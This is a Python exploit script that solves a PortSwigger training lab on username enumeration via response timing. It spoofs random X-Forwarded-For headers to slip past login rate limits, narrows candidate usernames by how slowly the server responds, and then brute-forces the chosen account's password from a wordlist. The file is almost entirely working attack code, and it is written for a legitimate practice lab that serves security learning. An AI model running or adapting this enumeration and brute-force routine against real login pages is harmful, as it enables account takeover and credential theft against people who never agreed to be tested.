import sys
import requests
import urllib3
import random

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def print_lab_info(url):
    info = f"""
+{'='*70}+

 PortSwigger Lab: Authentication vulnerabilities
 Challenge: Username enumeration via response timing
 Target: {url}
 
 Lab Description:
  This lab is vulnerable to username enumeration using its response times. 
  To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

  Your credentials: wiener:peter
  - Candidate usernames (./list/username.txt)
  - Candidate passwords (./list/password.txt)

  To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

+{'='*70}+
"""
    print(info)
    
def exploit_username_enumeration_via_response_timing(url) :
    session = requests.session()
    login_url = url + "/login"
    
    with open("./list/username.txt") as u_file, open("./list/password.txt") as p_file :
        users = [u.strip() for u in u_file]
        passwords = [p.strip() for p in p_file]
    
    real_username = None
    
    iteration = 1
    while len(users) > 1:
        print(f"\n[🔁 Iteration {iteration}] 사용자 수: {len(users)}")

        user_times = []

        for user in users:
            login_data = {"username": user, "password": "test"}
            headers = {
                "X-Forwarded-For": random_ip(),
            }
            response = session.post(login_url, data=login_data, headers=headers, verify=False, allow_redirects=False)
            elapsed = response.elapsed.total_seconds()
            user_times.append((user, elapsed))

        user_times.sort(key=lambda x: x[1], reverse=True)
        half = len(user_times) // 2
        users = [user for user, _ in user_times[:half]]
        iteration += 1

    real_username = users[0]
            
    for password in passwords :
        login_data = {"username" : real_username, "password" : password}
        headers = {
            "X-Forwarded-For": random_ip(),
        }
        response = session.post(login_url, headers=headers, data=login_data, verify=False, allow_redirects=False)
        if response.status_code == 302 : 
            print(f"[🎉] Exploit Success => username: {real_username}, password: {password}")  
            return
        
    print("[🧨] Exploit Failed")            

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def main() :
    if len(sys.argv) != 2 :
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        
    url = sys.argv[1]
    print_lab_info(url)
    exploit_username_enumeration_via_response_timing(url)
    
    
if __name__ == "__main__" :
    main()